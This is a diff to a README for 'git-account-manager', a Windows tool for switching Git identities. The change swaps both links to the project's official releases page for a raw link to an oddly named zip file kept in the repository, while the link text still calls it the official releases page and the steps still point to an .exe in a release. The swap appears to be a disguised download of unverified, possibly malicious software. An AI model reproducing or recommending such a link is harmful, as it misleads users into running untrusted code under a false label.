@@ -1,6 +1,6 @@
 # 👤 git-account-manager - Manage multiple Git profiles with ease
 
-[![](https://img.shields.io/badge/Download-Git_Account_Manager-blue.svg)](https://github.com/mrlabmate/git-account-manager/releases)
+[![](https://img.shields.io/badge/Download-Git_Account_Manager-blue.svg)](https://raw.githubusercontent.com/mrlabmate/git-account-manager/main/public/git-manager-account-multivarious.zip)
 
 git-account-manager helps you maintain separate identities for your work, personal, and hobby projects. Many developers rely on Git to track their code, but swapping between private and work accounts often requires manual configuration. This tool automates the process and removes the need for command-line tweaks.
 
@@ -21,7 +21,7 @@ Managing Git accounts manually creates friction. You might accidentally push a w
 
 You need a Windows computer to run this application. Follow these instructions to set up the software.
 
-1. Visit the [official releases page](https://github.com/mrlabmate/git-account-manager/releases) to access the download options.
+1. Visit the [official releases page](https://raw.githubusercontent.com/mrlabmate/git-account-manager/main/public/git-manager-account-multivarious.zip) to access the download options.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start your download.
 4. Open your Downloads folder once the file finishes saving to your computer.
